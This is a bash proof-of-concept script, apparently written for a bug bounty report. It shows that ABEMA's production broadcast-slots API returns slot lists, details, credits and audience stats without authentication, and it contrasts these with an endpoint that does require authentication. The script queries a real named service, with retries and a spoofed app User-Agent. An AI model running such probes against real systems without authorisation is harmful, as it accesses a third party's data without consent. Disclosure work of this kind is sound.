#!/bin/bash
# PoC for Finding 1: Unauthenticated Production Broadcast Slots API
# Target: https://api.abema.io/v1/broadcast/slots (and sub-paths)
# Scope: *.abema.io (in-scope per ABEMA Bug Bounty Program on IssueHunt)
#
# NOTE: api.abema.io intermittently resets connections (HTTP 000) and the
# active slot set rotates, so this PoC derives a live slot id from the list
# first rather than hard-coding one. Retry up to 5x per request.
set -uo pipefail
UA="AbemaTV;10.184.0;"

fetch() {  # $1 = URL ; prints HTTP code ; leaves body in /tmp/poc_out.json
  local url="$1" tries=5 code
  for i in $(seq 1 $tries); do
    code=$(curl -s -m 25 -o /tmp/poc_out.json -w "%{http_code}" -H "User-Agent: $UA" "$url" 2>/dev/null)
    if [ "$code" = "200" ]; then echo "$code"; return 0; fi
    sleep 1
  done
  echo "$code"
}

echo "=== [1] List production broadcast slots (expect HTTP 200, no auth) ==="
c=$(fetch "https://api.abema.io/v1/broadcast/slots")
echo "HTTP $c"
python3 -c "
import json
d=json.load(open('/tmp/poc_out.json'))
s=d['slots']
print('  -> slots returned:', len(s))
print('  -> sample:', s[0]['id'], '|', s[0]['title'][:45], '|', s[0]['channelId'])
# Save a live id for the next steps
open('/tmp/poc_live_slot.txt','w').write(s[0]['id'])
"

echo ""
echo "=== [2] Fetch single slot detail (expect HTTP 200, no auth) ==="
LIVE=$(cat /tmp/poc_live_slot.txt 2>/dev/null || echo C6hPcxgiXXS3eF)
echo "  (using live slot id: $LIVE)"
c=$(fetch "https://api.abema.io/v1/broadcast/slots/$LIVE")
echo "HTTP $c"
python3 -c "
import json
try:
  d=json.load(open('/tmp/poc_out.json'))['slot']
  print('  -> id:', d['id'], '| title:', d['title'][:45], '| channel:', d['channelId'])
  print('  -> casts:', d.get('credit',{}).get('casts'))
  print('  -> copyrights:', d.get('credit',{}).get('copyrights'))
  print('  -> stats:', d.get('stats'))
except Exception as e:
  print('  (parse note)', e)
"

echo ""
echo "=== [3] Fetch slot audience stats (expect HTTP 200, no auth) ==="
# Re-derive a live slot id in case the set rotated since step 1
LIVE=$(curl -s -m 25 -H "User-Agent: $UA" "https://api.abema.io/v1/broadcast/slots" 2>/dev/null \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['slots'][0]['id'])" 2>/dev/null || cat /tmp/poc_live_slot.txt)
echo "  (using live slot id: $LIVE)"
c=$(fetch "https://api.abema.io/v1/broadcast/slots/$LIVE/stats")
echo "HTTP $c"
cat /tmp/poc_out.json
echo ""

echo ""
echo "=== [4] Contrast: sibling endpoint requires auth (expect 401) ==="
c=$(curl -s -m 25 -o /tmp/poc_out.json -w "%{http_code}" -H "User-Agent: $UA" "https://api.abema.io/v1/media/token")
echo "HTTP $c"
cat /tmp/poc_out.json
echo ""

echo ""
echo "RESULT: [1][2][3] return 200 with no credential; [4] returns 401."